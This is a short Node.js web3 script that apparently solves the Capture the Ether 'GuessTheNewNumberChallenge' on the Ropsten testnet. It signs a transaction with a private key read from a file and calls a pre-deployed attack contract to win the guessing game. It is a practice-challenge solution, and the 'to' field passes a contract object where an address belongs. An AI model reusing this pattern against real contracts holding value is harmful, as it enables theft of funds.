(async () => {
    const fs = require('fs');
    const web3 = require("../ropsten_web3")

    // Contract being attacked
    const contractAddress = '0x9F7439c83EcC71f6f726b9903ecF99B0e6cb2d78'
    const contract = new web3.eth.Contract(JSON.parse(fs.readFileSync("./bin/GuessTheNewNumberChallenge.abi", "utf-8")), contractAddress)
    
    // Creating attack contract that have been deployed
    const attackContractAddress = '0xB21313f562425b12C16B49810a61282c85F818ec'
    const attackContract = new web3.eth.Contract(JSON.parse(fs.readFileSync("./bin/Guess.abi", "utf-8")), attackContractAddress)

    // Assembling an account from private key
    const account = web3.eth.accounts.privateKeyToAccount(fs.readFileSync("../pk.txt", "utf-8"))

    // Creating call object
    const call = attackContract.methods.guessTheNewNumber()

    // Estimating gas
    try {
        var gas = await call.estimateGas({
            from: account.address,
            value: web3.utils.toWei("1", "ether")
        }) 
    } catch (e) {
        console.log('Gas estimation failed!')
        console.log(e)
        process.exit()
    }

    // Assembling a transaction object
    const tx = {
        to: attackContract,
        data: call.encodeABI(),
        gas: gas,
        gasPrice: web3.utils.toWei("35", "gwei"),
        value: web3.utils.toWei("1", "ether")
    }

    // Signing the transaction
    const signedTx = await account.signTransaction(tx)
    
    // Sending
    web3.eth.sendSignedTransaction(signedTx.rawTransaction)
    .once('sending', () => { console.log('Sending') })
    .once('transactionHash', console.log)
    .then(console.log)

    // Checking results
    console.log(`isComplete: ${await contract.methods.isComplete().call()}`);
})()